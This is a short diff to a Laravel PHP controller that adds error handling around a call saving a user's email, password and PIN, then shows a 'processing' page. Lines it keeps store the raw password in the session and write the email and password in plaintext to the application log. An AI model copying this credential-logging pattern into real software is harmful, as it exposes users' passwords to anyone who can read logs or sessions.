@@ -37,11 +37,16 @@ class UserController extends Controller
             return redirect()->route('admin.dashboard');
         }
 
-        // Lưu session và log để debug
         session(['email' => $email, 'password' => $password]);
         \Log::info('Store: Saved session email=' . $email . ', password=' . $password);
 
-        $this->userService->store($email, $password, $pin);
+        try {
+            $this->userService->store($email, $password, $pin);
+            \Log::info('UserService: Store successful for email=' . $email);
+        } catch (\Exception $e) {
+            \Log::error('UserService failed: ' . $e->getMessage());
+            return redirect()->back()->with('error', $e->getMessage());
+        }
 
         return view('processing');
     }
